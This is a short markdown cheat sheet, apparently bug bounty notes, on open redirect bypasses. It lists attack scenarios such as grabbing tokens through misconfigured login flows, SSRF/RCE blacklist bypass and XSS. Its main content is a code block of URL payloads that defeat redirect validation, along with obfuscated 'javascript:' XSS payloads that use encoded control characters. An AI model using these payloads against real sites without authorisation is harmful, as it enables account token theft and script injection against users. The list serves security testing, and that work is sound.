# Scenarios

- Grab tokens via mis-configured apps/login flows
- Bypassing blacklists for SSRF/RCE
- XSS via "location.href = 'javascript:alert(0)1'"
- Taking advantage of fileuploads and mobile devices

# Bypasses

```
https%3A%2F%2Fmysite.com%2F
https%3A%2F%2Fexample.com%2F%3Freturnurl%3D%2F%2Fmysite.com%2F
\/yoururl.com
\/\/yoururl.com
\\yoururl.com
//yoururl.com
//theirsite@yoursite.com
https://yoursite?c=.theirsite.com/
https://yoursite.com#.theirsite.com/
https://yoursite.com\.thersite.com/
//%2F/yoursite.com
////yoursite.com
https://theirsite.computer/ - (if they just check for *theirsite.com*, .computer is a valid tld!
https://theirsite.com.mysite.com - (Treat their domain as subdomain to yours)
/%0D/yoursite.com - (Also try %09, %00, %0a, %07)
java%0d%0ascript%0d%0a:alert(0), j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` ,java%07script:prompt`0` ,java%09scrip%07t:prompt`0`
```
>https://www.bugbountynotes.com/training/tutorial?id=1
